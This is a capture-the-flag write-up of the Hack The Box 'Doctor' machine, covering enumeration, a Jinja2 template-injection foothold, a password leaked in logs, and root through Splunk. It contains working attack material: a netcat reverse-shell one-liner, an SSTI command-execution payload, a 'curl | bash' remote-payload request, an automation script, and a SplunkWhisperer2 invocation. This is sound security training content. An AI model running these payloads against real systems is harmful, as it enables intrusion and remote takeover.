---
layout: single
title: "Hackthebox write-up: Doctor"
namespace: "Hackthebox write-up: Doctor"
category: Writeup
tags: HackTheBox htb-easy htb-linux
date: 2021-02-06 12:00:00
header:
   teaser: https://i.imgur.com/EeJREQG.png
---
Hello everyone!

Starting to posting about some write-ups of CTF-like machines, the first one will be **Doctor**, an easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu) created by  cri [egotisticalSW](https://app.hackthebox.eu/users/94858).

:information_source: **Info**: Write-ups for Hack The Box will be posted as soon as machines get retired, so here's the first one :smiley:!
{: .notice--info}

![image-20210209083728228](https://i.imgur.com/7DBDPWU.png){: .align-center}

## Enumeration

So let's start with a quick enumeration of this box using `nmap`. Running a quick scan we received the following output, where 2 HTTP services were found, alongside a SSH port:

```bash
nmap -sC -sV -Pn -oA quick 10.10.10.209
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-14 19:46 -03
Nmap scan report for 10.10.10.209
Host is up (0.17s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.98 seconds
                                                                          
```

### 80 TCP - HTTP Service

Before starting the enumeration, checking the website using browser, noticed that it is an institutional site, that mentions an e-mail **info@doctors.htb**, where the domain `doctors.htb` might be the FQDN of this machine.

![image-20210114195257224](https://i.imgur.com/cRUWuPh.png){: .align-center}

To ensure proper enumeration of HTTP services which might be using DNS, changed local hosts file to reflect the correct name so we could also start enumerating the services.

```bash
$ sudo -i
# echo " " >> /etc/hosts
# echo "# HTB Doctors" >> /etc/hosts
# echo "10.10.10.209 doctors.htb" >> /etc/hosts
# cat /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
 
# HTB Doctors
10.10.10.209 doctors.htb
```

After changing the entry, once accessing the same url, a different page is displayed, as seen below:

![image-20210114210614527](https://i.imgur.com/bnqIzON.png){: .align-center}

Now that we have confirmed that the box contained a different content being hosted using the DNS, we'll start enumerating these websites using both ways so we can look for interesting opportunities for an initial foothold.

#### Whatweb

Checking `whatweb` for both sites noticed that the sites are hosted in different webservers, as seen below:

- Via IP address: `Apache[2.4.41], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], Email[info@doctors.htb], HTML5, Script, Bootstrap[4.3.1], JQuery[3.3.1]`
- Via DNS: `HTTPServer[Werkzeug/1.0.1 Python/3.8.2], Cookies[session], Python[3.8.2], HttpOnly[session], Werkzeug[1.0.1], RedirectLocation[http://doctors.htb/login?next=%2F]`

#### Manually enumerating the website

While checking the website I have noticed that on that login page would be possible also to reset a password and creating an account. The e-mail information we have (info@doctors.htb) was the first one tested but the error messages was saying that the account doesn't exist.

After some further testing, including checking the possibility to tamper the change password request, I decided change strategy and to try to create an account.

![image-20210115110541005](https://i.imgur.com/fSXdu3M.png){: .align-center}

After having one successfully created, the warning below is displayed, which means that **we'll only have 20 minutes** to use this recently created account.

![image-20210130194324306](https://i.imgur.com/R7dtMR4.png){: .align-center}

After having the account created, started enumerating the source code where I've found a `/archive` folder hidden in the page, but it didn't returned anything when first accessed.

```html
 <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
```

So going further I noticed the possibility to add a new message, where I have created the following dummy content:

![image-20210115111008460](https://i.imgur.com/JT3MZfR.png){: .align-center}

Accessing the posted message afterwards, I noticed that it redirects to `http://doctors.htb/post/2` but also nothing interesting besides the possibility of updating its content or deleting the message.

Manipulating the url, to try to access the other posts, eg /post/1, there was an message from user `admin` but also didn't took me nowhere else.

Things get interesting when I decided to access `/archive` again, where the content used in the message is displayed, allowing us to test some Server-Side Template Injection (SSTI) and possibly get a reverse shell.

In order to confirm this, following the guidance available on [SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify) I've changed the Title from my previous message in order to test some types of injections and determine the engine used, which will help us define the malicious injection itself.

![image-20210115111707069](https://i.imgur.com/vVVwKY2.png){: .align-center}

This injection worked flawlessly, indicating that we're handling Twig or Jinja2 :smile: (what makes sense, once this webservice, as noticed on whatweb, is **Werkzeug**, a very popular web application server normally used with Flask or Django).

![image-20210115111818436](https://i.imgur.com/EH0zQHN.png){: .align-center}

After a few tests, playing with the examples available at [PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection), I was able to confirm that the correct language to use would be **Jinja2**, once the content below worked properly, among others:

```python
{% raw %}{{config.items()}}{% endraw %}
```

## Initial Foothold

After confirming that a Jinja2 payload should be used, would be possible to get a reverse shell on the box using the following process:

- In a folder in the attacker machine, created a payload file containing the string to be used as payload to get a reverse shell.

  ```bash
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
  ```
  
- Then hosted a http server using python3 by running the command below from the same directory as the recently created file.

  ```bash
  sudo python3 -m http.server 80
  ```
  
- On the portal, created a post containing the following string on the title, obtained from previously mentioned PayloadsAllTheThings site. This one specially is very interesting for this situation, which allows us to get the **input** parameter from the GET request, so we would be able to change the commands to be issue to the system very easily.

  ```python
  {% raw %}{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}{% endraw %}
  ```
  
- Started listener using netcat by running the command below, selecting the same port defined in the payload file.

  ```bash
  nc -lnvp 4443
  ```

- Then made a request to the portal using the archive url appended by the command I wanted to execute.

  ```bash
  http://doctors.htb/archive?input=curl%20-L%20http://10.10.10.10/payload%20|%20bash
  ```

- And voilà! A reverse shell was returned :smiley:

![image-20210117191626475](https://i.imgur.com/TyHFL9D.png){: .align-center}

**Bonus** To make it easier regain initial foothold, once user account has a short validity of 20 minutes, I've created this python3 script to help on this task :smiley:. To use it just set up the listener and python web server, then the script will recreate the user, the message and then make the request to get the reverse shell again
{: .notice--info}

```python
#!/usr/bin/python3

import requests

url = 'http://doctors.htb'
username = 'dummy'
password = 'P@ssw0rd'
ip = '10.10.10.10'
email = username+'@doctors.htb'

# Create new session
s = requests.session()

# Make initial request to get required cookies
r = s.get(url)

# Create user
payload = {'username':username,'email':email,'password':password,'confirm_password':password,'submit':'Sign Up'}
r = s.post(url+'/register',data=payload)

# Login
payload = {'email':email,'password':password,'submit':'Login'}
r = s.post(url+'/login?next=%2Fhome',data=payload)

# Create message
{% raw %}
title = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}"
{% endraw %}
payload = {'title':title,'content':'content','submit':'Post'}
r = s.post(url+'/post/new',data=payload)

# Get Reverse shell
command = requests.utils.quote('curl -L http://'+ip+'/payload | bash')
r = s.get(url+'/archive?input='+command)
```

## User flag

After getting a reverse shell, [I have upgraded it](https://blog.mrtnrdl.de/infosec/2019/05/23/obtain-a-full-interactive-shell-with-zsh.html) and then started to enumerate box:

- The existing users in this box, based in the enumeration of home folders are **shaun** and **web**

- Checking the groups that the current user **web** is member, we notice that this account is member of group **adm**

  ```bash
  web@doctor:/home$ id
  uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
  ```

  - The **adm** group on Linux systems grants access to files located at `/var/log`, which will possibly allow us to find some sensitive information in the logs from webservices or other tasks.

### Analyzing log files under /var/log

So to start this analysis let's see which components, besides the system defaults, we have being logged on this box

```bash
web@doctor:/var/log$ ls -ld */
drwxr-x---  2 root              adm             4096 Jan 31 00:00 apache2/
drwxr-xr-x  2 root              root            4096 Sep  7 12:13 apt/
drwxr-xr-x  2 root              root            4096 Jan 31 00:00 cups/
drwxr-xr-x  2 root              root            4096 Apr  8  2020 dist-upgrade/
drwxr-xr-x  3 root              root            4096 Apr 23  2020 hp/
drwxrwxr-x  2 root              root            4096 Jul 26  2020 installer/
drwxr-sr-x+ 3 root              systemd-journal 4096 Jul 20  2020 journal/
drwxr-xr-x  2 root              root            4096 Sep  5  2019 openvpn/
drwx------  2 root              root            4096 Apr 23  2020 private/
drwx------  2 speech-dispatcher root            4096 Jan 19  2020 speech-dispatcher/
drwxr-x---  2 root              adm             4096 Jan 30 19:13 unattended-upgrades/
```

Starting with Apache2 logs, as this is one of the previously enumerated features and also considering the creation date of this box (so we can ignore most recent information on it) we'll have a interesting file, non-default, in this folder, which is a file called **backup**

```bash
web@doctor:/var/log/apache2$ ls -la | grep -v 'Jan 3'
total 7980
-rw-r-----  1 root adm       1266 Sep  5 11:58 access.log.10.gz
-rw-r-----  1 root adm        323 Aug 21 13:00 access.log.11.gz
-rw-r-----  1 root adm        270 Aug 18 12:48 access.log.12.gz
-rw-r--r--  1 root root   2194472 Jul 27  2020 access.log.13.gz
-rw-r-----  1 root adm        668 Sep 28 15:02 access.log.2.gz
-rw-r-----  1 root adm       1493 Sep 23 15:20 access.log.3.gz
-rw-r-----  1 root adm       3951 Sep 22 12:58 access.log.4.gz
-rw-r-----  1 root adm       1341 Sep 19 19:17 access.log.5.gz
-rw-r-----  1 root adm     664054 Sep 15 14:27 access.log.6.gz
-rw-r-----  1 root adm        384 Sep 14 10:07 access.log.7.gz
-rw-r-----  1 root adm       3018 Sep  7 17:24 access.log.8.gz
-rw-r-----  1 root adm       1338 Sep  6 22:46 access.log.9.gz
-rw-r-----  1 root adm      21578 Sep 17 16:23 backup
-rw-r-----  1 root adm        460 Sep 15 00:00 error.log.10.gz
-rw-r-----  1 root adm        476 Sep  7 17:46 error.log.11.gz
-rw-r-----  1 root adm        537 Sep  6 22:47 error.log.12.gz
-rw-r-----  1 root adm        680 Sep  5 11:58 error.log.13.gz
-rw-r-----  1 root adm        341 Sep  5 00:00 error.log.14.gz
-rw-r-----  1 root adm        789 Sep 28 15:07 error.log.2.gz
-rw-r-----  1 root adm       1092 Sep 23 15:42 error.log.3.gz
-rw-r-----  1 root adm        846 Sep 22 13:03 error.log.4.gz
-rw-r-----  1 root adm        655 Sep 22 10:40 error.log.5.gz
-rw-r-----  1 root adm        352 Sep 19 00:00 error.log.6.gz
-rw-r-----  1 root adm        424 Sep 18 00:00 error.log.7.gz
-rw-r-----  1 root adm        428 Sep 17 00:00 error.log.8.gz
-rw-r-----  1 root adm        629 Sep 16 00:00 error.log.9.gz
-rw-r--r--  1 root root         0 Jul 27  2020 other_vhosts_access.log
```

Checking its contents, looking for the Query strings of the logged requests, we have observed an interesting entry, as below, which leaks a possible password **Guitar123**

```bash
web@doctor:/var/log/apache2$ awk -F" " '{print $7}' backup | sort | uniq
/
12.1.2\n"
400
/evox/about
/favicon.ico
/.git/HEAD
/HNAP1
/home
/icons/ubuntu-logo.png
/login
/nmaplowercheck1599231606
/nmaplowercheck1599231646
/post/new
/register
/reset_password?email=Guitar123"
/robots.txt
/sdk
/static/main.css
/static/profile_pics/default.gif
```

As the existing user in the box is **shaun**, trying to change user using this credential turned out to be successful, which allowed us to get the user flag:

```bash
shaun@doctor:~$ ls -la
total 44
drwxr-xr-x 6 shaun shaun 4096 Sep 15 12:51 .
drwxr-xr-x 4 root  root  4096 Sep 19 16:54 ..
lrwxrwxrwx 1 root  root     9 Sep  7 14:31 .bash_history -> /dev/null
-rw-r--r-- 1 shaun shaun  220 Sep  6 16:26 .bash_logout
-rw-r--r-- 1 shaun shaun 3771 Sep  6 16:26 .bashrc
drwxr-xr-x 4 shaun shaun 4096 Sep 22 13:00 .cache
drwx------ 4 shaun shaun 4096 Sep 15 11:14 .config
drwx------ 4 shaun shaun 4096 Sep 15 11:57 .gnupg
drwxrwxr-x 3 shaun shaun 4096 Sep  6 18:01 .local
-rw-r--r-- 1 shaun shaun  807 Sep  6 16:26 .profile
-rw-rw-r-- 1 shaun shaun   66 Sep 15 12:51 .selected_editor
-r-------- 1 shaun shaun   33 Jan 30 19:12 user.txt
shaun@doctor:~$ cat user.txt 
<redacted>
```

## Root flag

Now running as shaun, noticed that he's unable to run commands using sudo.

```bash
shaun@doctor:/tmp$ sudo -l
[sudo] password for shaun: 
Sorry, user shaun may not run sudo on d
```

After running `linpeas.sh` from [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) the most prominent way to get a root shell should be through **splunkd** service, which is published through TCP 8089 as previously noticed on nmap scans.

After browsing it directly, once I have clicked in the **services** link, as image below, an authentication prompt was shown. As the only credential we had is shaun it was the first one tried, which resulted in success :smiley:.

![image-20210131080459535](https://i.imgur.com/R4VNKDe.png)

![image-20210131080540525](https://i.imgur.com/lsTJ2cg.png)

As we have credentials to logon to the Splunk Service, the next step is to find a way to get an RCE on this service. Doing some research I came across [Abusing Splunk Forwarders For Shells and Persistence · Eapolsniper's Blog](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) that mentions [GitHub - cnotin/SplunkWhisperer2: Local privilege escalation, or remote code execution, through Splunk Universal Forwarder (UF) misconfigurations](https://github.com/cnotin/SplunkWhisperer2), which is a tool that makes easier to get a command execution from the access we already have.

After running the command below, was possible to obtain a reverse shell under root permissions:

```bash
$ python3 ./PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password Guitar123 --payload "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f" --lhost 10.10.10.10
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpcae79s9x.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.10.10:8181/
10.10.10.209 - - [04/Feb/2021 19:46:38] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup

[.] Removing app...
[+] App removed
[+] Stopped HTTP server
Bye!
```

From the reverse shell obtained, was able to get the content from `/root/root.txt` without problems

```bash
# cat /root/root.txt
<redacted>
```

I hope it was somehow useful!

See you in the next post! :smile:
